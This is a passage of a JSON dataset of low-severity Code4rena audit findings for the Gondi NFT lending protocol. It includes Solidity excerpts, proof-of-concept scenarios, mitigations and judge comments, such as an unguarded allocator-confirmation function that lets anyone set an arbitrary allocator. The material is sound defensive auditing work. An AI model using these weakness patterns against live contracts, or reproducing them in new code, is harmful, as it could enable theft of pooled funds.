between), they cannot be merged as well.\n\n### Recommended Mitigation Steps\n\nTo get the correct main lender, sum up the total principal in different tranches from the same lender.\n\n**[0xend (Gondi) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/55#issuecomment-2067093038):**\n> I think this is highly unlikely given tranches have seniority. Looks like I forgot to check for `_getMinTranchePrincipal` (will be addressed in the mitigation review) which would also set a cost for caleb.\n> \n> I'd say this is definitely low risk. Lastly, lender could actually refinance the small tranche from the borrower and merge all tranches.\n\n**[0xA5DF (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/55#issuecomment-2067961567):**\n> I think that selecting the lender with the biggest tranche rather than the biggest share is a reasonable design considering that finding the lender with the biggest share would be much more complicated and expensive to do on chain. And it isn't like the lender with the biggest share is losing their debt payment.\n> \n> Regarding manipulation, as long as it happens at the beginning of the loan, far from the starting time of the auction, I don't think it's significant. Marking as Low.\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/70#issuecomment-2067964983):**\n> | Risk | Title | Verdict |\n> |:----:|:-----------:|---------|\n> | 01 | No need to approve `_aavePool` to spend `_aToken` | R |\n> | 02 | Open TODOs | R |\n> | 03 | Function `burnAndWithdraw()` does not withdraw old ERC721s | L |\n> | 04 | Function in `BytesLib` could revert with no error message | R |\n> | 05 | `setProtocolFee()` can be called multiple times to spam event emission | R |\n> | 06 | Repayment and liquidation could be blocked if token has a callhook to receiver | L |\n> | 07 | Wrong event emission in `finalUpdateMultiSourceLoanAddress()` | L |\n> | 08 | `addCallers()` does not check `_callers.length == pendingCallers.length` | L |\n> | 09 | Partial refinance offer could be used in `refinanceFull()` | L |\n> | 10 | Owner can set `_multiSourceLoan` to `address(0)` directly without `updateMultiSourceLoanAddressFirst()` | L |\n> | 11 | Slippage of stETH swap could make `validateOffer()` revert | L |\n> | 12 | Modifier `onlyReadyForWithdrawal` is repeatedly execute when users withdraw multiple tokens | R |\n> | 13 | Should use defined variable in function `_checkValidators()` | NC |\n> | 14 | Function `_checkStrictlyBetter()` does not check for `ImprovementMinimum` | L |\n> | 15 | Owner cannot change the allocator address from `address(0)` | L |\n> | 16 | Attacker can set arbitrary allocator in case `cachedAllocator == address(0)` | L |\n> | 17 | Possible overflow when borrower accepts renegotiation offer in `refinanceFull()` | L |\n> | 18 | Function `settleWithBuyout()` incorrectly calculate the main lender because single lender can have multiple tranches in a loan | L |\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/55",
      "tags": [],
      "finders": []
    },
    {
      "id": "35256",
      "title": "[17] Possible overflow when borrower accepts renegotiation offer in `refinanceFull()`",
      "impact": "LOW",
      "content": "\n*Note: At the judge’s request [here](https://github.com/code-423n4/2024-04-gondi-findings/issues/70#issuecomment-2067964983), this downgraded issue from the same warden has been included in this report for completeness.*\n\nhttps://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L195\n\n### Impact\n\nIn the `refinanceFull()` function, if the borrower is the caller, it signifies a renegotiation offer. The borrower will clear the accrued interest, permitting them to repay the accrued interest without waiting for the full loan repayment. \n\n```solidity\n} else {\n    /// @notice Borrowers clears interest\n    _checkSignature(_renegotiationOffer.lender, _renegotiationOffer.hash(), _renegotiationOfferSignature);\n    netNewLender -= totalAccruedInterest; // @audit possible overflow when netNewLender < totalAccruedInterest\n    totalAccruedInterest = 0;\n}\n```\n\nHowever, if `netNewLender < totalAccruedInterest`, there's a risk of overflow. Consequently, `refinanceFull()` will revert, preventing the borrower from accepting the renegotiation offer.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n1. Alice (the borrower) takes a 10 ETH loan, and the accrued interest is already 2.1 ETH.\n2. Alice wants to reduce the principal amount and is interested in a renegotiation offer from Bob for a 2 ETH principal amount loan.\n3. When Alice calls `refinanceFull()` and passes in Bob's renegotiation offer, it reverts because:\n\n```solidity\nnetNewLender = principalAmount - fee = 2 eth (assume fee = 0)\ntotalAccruedInterest = 2.1 eth\nnetNewLender -= totalAccruedInterest (revert)\n```\n\n### Recommended Mitigation Steps\n\nConsider deducting only `min(netNewLender, totalAccruedInterest)` from `netNewLender`.\n\n### Assessed type\n\nUnder/Overflow\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/56#issuecomment-2067080946):**\n> Given the nature of loans, renegotiating a loan to a principal lower than interest accrues seems highly unlikely but would consider this. I think this is a low.\n\n**[0xA5DF (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/56#issuecomment-2067669302):**\n> @0xend - Marking as low due to this. If the warden can prove that this scenario is at least somewhat likely to happen I'd consider reinstating Medium severity.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/56",
      "tags": [],
      "finders": []
    },
    {
      "id": "35255",
      "title": "[16] Attacker can set arbitrary allocator in case `cachedAllocator == address(0)`",
      "impact": "LOW",
      "content": "\n*Note: At the judge’s request [here](https://github.com/code-423n4/2024-04-gondi-findings/issues/70#issuecomment-2067964983), this downgraded issue from the same warden has been included in this report for completeness.*\n\nhttps://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L204\n\n### Impact\n\nThe base interest allocator is set in the Pool through two steps: `setBaseInterestAllocator()` and `confirmBaseInterestAllocator()`. The `confirmBaseInterestAllocator()` function allows anyone to call it.\n\nThis function will execute the logic using the `_newBaseInterestAllocator` input passed in by the caller, instead of the value set by the owner in `setBaseInterestAllocator()`. The verification for `_newBaseInterestAllocator == getPendingBaseInterestAllocator` is only performed when `cachedAllocator != address(0)`.\n\nAs a result, if `cachedAllocator == address(0)`, anyone can set an arbitrary address for the allocator. And since the asset is approved to the new allocator address, attacker could steal all the fund available in the Pool contract.\n\n### Proof of Concept\n\n```solidity\nfunction confirmBaseInterestAllocator(address _newBaseInterestAllocator) external {\n    address cachedAllocator = getBaseInterestAllocator;\n    // @audit in case cachedAllocator = address(0), anyone can set arbitrary allocator \n    if (cachedAllocator != address(0)) { \n        if (getPendingBaseInterestAllocatorSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n            revert TooSoonError();\n        }\n        if (getPendingBaseInterestAllocator != _newBaseInterestAllocator) {\n            revert InvalidInputError();\n        }\n        IBaseInterestAllocator(cachedAllocator).transferAll();\n        asset.approve(cachedAllocator, 0);\n    }\n    asset.approve(_newBaseInterestAllocator, type(uint256).max);\n\n    getBaseInterestAllocator = _newBaseInterestAllocator;\n    getPendingBaseInterestAllocator = address(0);\n    getPendingBaseInterestAllocatorSetTime = type(uint256).max;\n\n    emit BaseInterestAllocatorSet(_newBaseInterestAllocator);\n}\n```\n\nAs we can see, the check if input `_newBaseInterestAllocator` matches the pending value is only performed when `cachedAllocator != address(0)`. The same applies to the `UPDATE_WAITING_TIME` check.\n\nIf the contract is deployed without an allocator set up, or whenever the owner sets the allocator address to `0`, an attacker could call `confirmBaseInterestAllocator()` to set it to an arbitrary address.\n\n### Recommended Mitigation Steps\n\nConsider running all the checks when `cachedAllocator == address(0)` as well.\n\n### Assessed type\n\nInvalid Validation\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/61#issuecomment-2060469818):**\n> I have some doubts about severity, since this can happen only at the initial stage, and the owner can simply set this to the right address (owner would have to wait some time though). Leaving open for the sponsor to comment.\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/61#issuecomment-2067335348):**\n> This is definitely an issue but as pointed out, a low one.\n\n**[0xA5DF (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/61#issuecomment-2067666159):**\n> Yeah, but when the allocator is changed, the approval is revoked for the old allocator. As this happens only at the initial stage then no funds are expected to be in the pool at this time.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/61",
      "tags": [],
      "finders": []
    },
    {
      "id": "35254",
      "title": "[15] Owner cannot change the allocator address from `address(0)`",
      "impact": "LOW",
      "content": "\n*Note: At the judge’s request [here](https://github.com/code-423n4/2024-04-gondi-findings/issues/70#issuecomment-2067964983), this downgraded issue from the same warden has been included in this report for completeness.*\n\nhttps://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L202\n\n### Impact\n\nThe base interest allocator is set in the Pool through two steps: `setBaseInterestAllocator()` and `confirmBaseInterestAllocator()`. The `confirmBaseInterestAllocator()` function can be called by anyone.\n\nThis function executes the logic using the `_newBaseInterestAllocator` input from the caller, not the value set by the owner in `setBaseInterestAllocator()`. The check for `_newBaseInterestAllocator == getPendingBaseInterestAllocator` is only done when `cachedAllocator != address(0)`.\n\nAfter all, the pending values are reset. `getPendingBaseInterestAllocator` is reset to `address(0)` and `getPendingBaseInterestAllocatorSetTime` is reset to `type(uint256).max`. An attacker could exploit this to prevent the owner from changing the allocator address from `address(0)`.\n\n### Proof of Concept\n\n```solidity\nfunction confirmBaseInterestAllocator(address _newBaseInterestAllocator) external {\n    address cachedAllocator = getBaseInterestAllocator;\n    if (cachedAllocator != address(0)) { \n        if (getPendingBaseInterestAllocatorSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n            revert TooSoonError();\n        }\n        if (getPendingBaseInterestAllocator != _newBaseInterestAllocator) {\n            revert InvalidInputError();\n        }\n        IBaseInterestAllocator(cachedAllocator).transferAll();\n        asset.approve(cachedAllocator, 0);\n    }\n    asset.approve(_newBaseInterestAllocator, type(uint256).max);\n\n    getBaseInterestAllocator = _newBaseInterestAllocator;\n    getPendingBaseInterestAllocator = address(0);\n    getPendingBaseInterestAllocatorSetTime = type(uint256).max;\n\n    emit BaseInterestAllocatorSet(_newBaseInterestAllocator);\n}\n```\n\nWhen the owner tries to change the allocator address from an `address(0)` allocator, they need to call `setBaseInterestAllocator()`. This function records the request in `getPendingBaseInterestAllocator` and `getPendingBaseInterestAllocatorSetTime`.\n\nIf the attacker immediately calls the `confirmBaseInterestAllocator()` function with `_newBaseInterestAllocator = address(0)`, the `getPendingBaseInterestAllocator` will reset, preventing the owner from ever setting a new base interest allocator.\n\n### Recommended Mitigation Steps\n\nOnly allow owner to call `confirmBaseInterestAllocator()`.\n\n### Assessed type\n\nDoS\n\n**[0xA5DF (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/62#issuecomment-2060467853):**\n> > If the attacker immediately calls the `confirmBaseInterestAllocator()` function with `_newBaseInterestAllocator = address(0)`, the `getPendingBaseInterestAllocator` will reset, preventing the owner from ever setting a new base interest allocator.\n> \n> If the attacker calls `confirmBaseInterestAllocator()` with the zero address then the owner can call this again with the right address. If the attacker calls this with anything else then the owner can call again `setBaseInterestAllocator()` and then `confirmBaseInterestAllocator()`.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/62#event-12543252830)**\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/62",
      "tags": [],
      "finders": []
    },
    {
      "id": "35253",
      "title": "[14] Function `_checkStrictlyBetter()` does not check for `ImprovementMinimum`",
      "impact": "LOW",
      "content": "\n*Note: At the judge’s request [here](https://github.com/code-423n4/2024-04-gondi-findings/issues/70#issuecomment-2067964983), this downgraded issue from the same warden has been included in this report for completeness.*\n\nhttps://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L835-L846\n\n### Impact\n\nThe `ImprovementMinimum` defines the minimum improvement (in BPS) required for a strict improvement when users refinance an existing loan.\n\n```solidity\nstruct ImprovementMinimum {\n    uint256 principalAmount;\n    uint256 interest;\n    uint256 duration;\n}\n```\n\nAt deployment, its value is set as:\n\n```solidity\nImprovementMinimum internal _minimum = ImprovementMinimum(500, 100, 100);\n```\n\nThe code snippets above demonstrate that three improvements are required when users refinance: principal amount, interest, and loan duration. However, the function `_checkStrictlyBetter()` currently checks only the APR (interest) in `_checkTrancheStrictly()`. The other `principalAmount` and `endTime` are checked to be larger than the previous values but not checked for minimum improvement in the function `_checkStrictlyBetter()`.\n\n### Proof of Concept\n\nAs you can see, the `_checkTrancheStrictly()` checks the APR to be improved by `__minimum.interest`. However, the duration is only checked to be `_offerEndTime < _loanEndTime` in `_checkStrictlyBetter()`.\n\n```solidity\nfunction _checkTrancheStrictly(\n    bool _isStrictlyBetter,\n    uint256 _currentAprBps,\n    uint256 _targetAprBps,\n    ImprovementMinimum memory __minimum\n) private pure {\n    /// @dev If _isStrictlyBetter is set, and the new apr is higher, then it'll underflow.\n    if (\n        _isStrictlyBetter\n            && ((_currentAprBps - _targetAprBps).mulDivDown(_PRECISION, _currentAprBps) < __minimum.interest)\n    ) {\n        revert InvalidRenegotiationOfferError();\n    }\n}\n\n// @audit not check ImprovementMinimum for principalAmount and endTime\nif (\n    (\n        (_offerPrincipalAmount - _loanPrincipalAmount > 0)\n            && (\n                (_loanAprBps * _loanPrincipalAmount - _offerAprBps * _offerPrincipalAmount).mulDivDown(\n                    _PRECISION, _loanAprBps * _loanPrincipalAmount\n                ) < minimum.interest\n            )\n    ) || (_offerFee > 0) || (_offerEndTime < _loanEndTime) \n) {\n    revert NotStrictlyImprovedError();\n}\n```\n\n### Recommended Mitigation Steps\n\nAdd check to ensure the required minimum improvement when users refinance a loan. \n\n### Assessed type\n\nInvalid Validation\n\n**[0xend (Gondi) acknowledged and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/68#issuecomment-2067054065):**\n> We should get rid of this one. This was left as legacy (only improving apr matters).\n\n**[0xA5DF (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/68#issuecomment-2067659989):**\n> Thanks, it indeed seems from the code that those checks were supposed to run, therefore this is a valid issue. However, regarding severity - I fail to see why this is a significant issue. How does this impact the borrower or other users?\n\n**[0xend (Gondi) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/68#issuecomment-2067713984):**\n> No impact on borrower/lender. \n>\n> https://github.com/pixeldaogg/florida-contracts/pull/361 - changing.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/68",
      "tags": [],
      "finders": []
    },
    {
      "id": "35252",
      "title": "[13] Should use defined variable in function `_checkValidators()`",
      "impact": "LOW",
      "content": "\n[MultiSourceLoan.sol#L899-L901](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L899-L901)\n\n```solidity\nfunction _checkValidators(LoanOffer calldata _loanOffer, uint256 _tokenId) private {\n    uint256 offerTokenId = _loanOffer.nftCollateralTokenId;\n    // @audit Should use the cache value above\n    if (_loanOffer.nftCollateralTokenId != 0) {\n```\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35251",
      "title": "[12] Modifier `onlyReadyForWithdrawal` is repeatedly execute when users withdraw multiple tokens",
      "impact": "LOW",
      "content": "\n[UserVault.sol#L80-L85](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/UserVault.sol#L80-L85)\n\n### Details\n\n```solidity\nmodifier onlyReadyForWithdrawal(uint256 _vaultId) { // @audit Repeatedly checked when withdraw multiple tokens\n    if (_readyForWithdrawal[_vaultId] != msg.sender) {\n        revert NotApprovedError(_vaultId);\n    }\n    _;\n}\n```\n\nThe `onlyReadyForWithdrawal` modifier is used to check if the vault can be withdrawn and the permitted caller is call it. However, this check is performed in internal function, making it repeatedly call for the same `_vaultId` when users withdraw more than 1 token.\n\n```solidity\nfunction withdrawERC721s(uint256 _vaultId, address[] calldata _collections, uint256[] calldata _tokenIds)\n    external\n{\n    ...\n    for (uint256 i = 0; i < _collections.length;) {\n        _withdrawERC721(_vaultId, _collections[i], _tokenIds[i]);\n        unchecked {\n            ++i;\n        }\n    }\n}\n\nfunction _withdrawERC721(uint256 _vaultId, address _collection, uint256 _tokenId)\n    private\n    onlyReadyForWithdrawal(_vaultId)\n{\n    ...\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35250",
      "title": "[11] Slippage of stETH swap could make `validateOffer()` revert",
      "impact": "LOW",
      "content": "\n[Pool.sol#L407-L413](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L407-L413)\n\n### Details\n\nThe `MultiSourceLoan` contract calls the `validateOffer()` function to verify that the loan term has been approved by the Pool contract. This function also draws the necessary capital from the base interest allocator to ensure a sufficient balance for the loan.\n\nAs the pool's balance includes capital awaiting claim by the queues, it needs to verify that the pool has enough capital to fund the loan. If this isn't the case, and the principal exceeds the current balance, the function needs to reallocate part of it.\n\n```solidity\nif (principalAmount > undeployedAssets) {\n    revert InsufficientAssetsError();\n} else if (principalAmount > currentBalance) {\n    IBaseInterestAllocator(getBaseInterestAllocator).reallocate( // @audit slippage of Lido swap could make the pool insufficient\n        currentBalance, principalAmount - currentBalance, true\n    );\n}\n```\n\nHowever, the `reallocate()` function for the `LidoEthBaseInterestAllocator` performs a swap that could cause slippage. This could result in the contract still not having enough balance to provide the loan, even after calling `reallocate()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35249",
      "title": "[10] Owner can set `_multiSourceLoan` to `address(0)` directly without `updateMultiSourceLoanAddressFirst()`",
      "impact": "LOW",
      "content": "\n[PurchaseBundler.sol#L238-L247](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/callbacks/PurchaseBundler.sol#L238-L247)\n\n### Details\n\nThe `_pendingMultiSourceLoanAddress` has default value is `address(0)`. As the result, owner could always call `finalUpdateMultiSourceLoanAddress()` to set the `_multiSourceLoan` to `address(0)` without calling `updateMultiSourceLoanAddressFirst()` first.\n\n```solidity\n    function finalUpdateMultiSourceLoanAddress(address _newAddress) external onlyOwner { // @audit can set `_multiSourceLoan` to address(0) directly without `updateMultiSourceLoanAddressFirst()`\n        if (_pendingMultiSourceLoanAddress != _newAddress) {\n            revert InvalidAddressUpdateError();\n        }\n\n        _multiSourceLoan = MultiSourceLoan(_pendingMultiSourceLoanAddress);\n        _pendingMultiSourceLoanAddress = address(0);\n\n        emit MultiSourceLoanUpdated(_pendingMultiSourceLoanAddress);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35248",
      "title": "[09] Partial refinance offer could be used in `refinanceFull()`",
      "impact": "LOW",
      "content": "\n[MultiSourceLoan.sol#L162-L169](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L162-L169)\n\n### Details\n\nThe function `refinanceFull()` does not verify the `_renegotiationOffer.trancheIndex` to ensure it includes all the indexes of the current loan.\n\n```solidity\n    function refinanceFull(\n        RenegotiationOffer calldata _renegotiationOffer,\n        Loan memory _loan,\n        bytes calldata _renegotiationOfferSignature\n    ) external nonReentrant returns (uint256, Loan memory) { // @audit not check _renegotiationOffer.trancheIndex.length = 0\n        _baseLoanChecks(_renegotiationOffer.loanId, _loan);\n        _baseRenegotiationChecks(_renegotiationOffer, _loan);\n```\n\nAs a result, if a lender signs a partial refinance offer, others could use the same signature to call `refinanceFull()`. This could act against the lender's intention when signing the offer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35247",
      "title": "[08] `addCallers()` does not check `_callers.length == pendingCallers.length`",
      "impact": "LOW",
      "content": "\n[LoanManager.sol#L80](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/LoanManager.sol#L80)\n\n### Details\n\nFunction lacking check to ensure the pending list is the same as the list input by caller.\n\n```solidity\nfunction addCallers(PendingCaller[] calldata _callers) external onlyOwner {\n    if (getPendingAcceptedCallersSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n        revert TooSoonError();\n    }\n    PendingCaller[] memory pendingCallers = getPendingAcceptedCallers; // @audit not check _callers.length == pendingCallers.length\n    for (uint256 i = 0; i < _callers.length;) {\n        ...\n    }\n\n    emit CallersAdded(_callers);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35246",
      "title": "[07] Wrong event emission in `finalUpdateMultiSourceLoanAddress()`",
      "impact": "LOW",
      "content": "\n[PurchaseBundler.sol#L238-L247](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/callbacks/PurchaseBundler.sol#L238-L247)\n\n### Details\n\nWrong variable is used when emit `MultiSourceLoanUpdated` event.\n\n```solidity\nfunction finalUpdateMultiSourceLoanAddress(address _newAddress) external onlyOwner {\n    if (_pendingMultiSourceLoanAddress != _newAddress) {\n        revert InvalidAddressUpdateError();\n    }\n\n    _multiSourceLoan = MultiSourceLoan(_pendingMultiSourceLoanAddress);\n    _pendingMultiSourceLoanAddress = address(0);\n\n    // @audit wrong event, _pendingMultiSourceLoanAddress is already reset to 0\n    emit MultiSourceLoanUpdated(_pendingMultiSourceLoanAddress);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35245",
      "title": "[06] Repayment and liquidation could be blocked if token has a callhook to receiver",
      "impact": "LOW",
      "content": "\n[AuctionLoanLiquidator.sol#L285](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionLoanLiquidator.sol#L285)\n\n[LiquidationDistributor.sol#L88](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/LiquidationDistributor.sol#L88)\n\n[MultiSourceLoan.sol#L946](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L946)\n\n### Details\n\nSome tokens like ERC777 has a callhook on receiver address. If these tokens are used in a loan, it could allow attacker to force liquidation/repayment to fail. For example, the function `settleAuction()` transfer the fee to originator. The originator could be an contract that will revert when receiving token transfer, making it impossible for auction to settle.\n```solidity\nasset.safeTransfer(_auction.originator, triggerFee); // @audit can revert if the token has callhook on receiver\nasset.safeTransfer(msg.sender, triggerFee);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35244",
      "title": "[05] `setProtocolFee()` can be called multiple times to spam event emission",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/utils/WithProtocolFee.sol#L73\n\n### Details\n\nFunction `setProtocolFee()` does not reset the pending value (`_pendingProtocolFee`). As the result, `setProtocolFee()` can be called infinite times. Even though the protocol fee cannot be changed, the event will be emit multiple times.\n\n```solidity\n// @audit setProtocolFee can be called again since _pendingProtocolFeeSetTime is not reset\nfunction setProtocolFee() external virtual { \n    _setProtocolFee();\n}\n\nfunction _setProtocolFee() internal {\n    if (block.timestamp < _pendingProtocolFeeSetTime + FEE_UPDATE_NOTICE) {\n        revert TooSoonError();\n    }\n    ProtocolFee memory protocolFee = _pendingProtocolFee;\n    _protocolFee = protocolFee;\n\n    emit ProtocolFeeUpdated(protocolFee);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35243",
      "title": "[04] Function in `BytesLib` could revert with no error message",
      "impact": "LOW",
      "content": "\n[BytesLib.sol](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/utils/BytesLib.sol)\n\n### Details\n\nAll functions in `BytesLib` have some require check for overflow. However, these checks will only work with Solidity version `< 0.8` because Solidity 0.8 already has some overflow check. \n\nFor example, in the function `slice()`, in the case overflow actually happens in the first check, the calculation `_length + 31` is already revert by solidity 0.8 before checking the condition in the require.\n\n```solidity\nfunction slice(bytes memory _bytes, uint256 _start, uint256 _length) internal pure returns (bytes memory) {\n    require(_length + 31 >= _length, \"slice_overflow\");\n    require(_start + _length >= _start, \"slice_overflow\"); // @audit These calculation will revert with solidity 0.8\n    require(_bytes.length >= _start + _length, \"slice_outOfBounds\");\n    ...\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35242",
      "title": "[03] Function `burnAndWithdraw()` does not withdraw old ERC721s",
      "impact": "LOW",
      "content": "\n[UserVault.sol#L125](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/UserVault.sol#L125)\n\n### Details\n\nThe function `burnAndWithdraw()` should burn the vault and withdraw all assets in that vault. However, the old ERC721 is not withdrawn.\n\n```solidity\nfunction burnAndWithdraw( // @audit Not withdraw old ERC721\n    uint256 _vaultId,\n    address[] calldata _collections,\n    uint256[] calldata _tokenIds,\n    address[] calldata _tokens\n) external {\n    _thisBurn(_vaultId, msg.sender);\n    for (uint256 i = 0; i < _collections.length;) {\n        _withdrawERC721(_vaultId, _collections[i], _tokenIds[i]);\n        unchecked {\n            ++i;\n        }\n    }\n    for (uint256 i = 0; i < _tokens.length;) {\n        _withdrawERC20(_vaultId, _tokens[i]);\n        unchecked {\n            ++i;\n        }\n    }\n    _withdrawEth(_vaultId);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35241",
      "title": "[02] Open TODOs",
      "impact": "LOW",
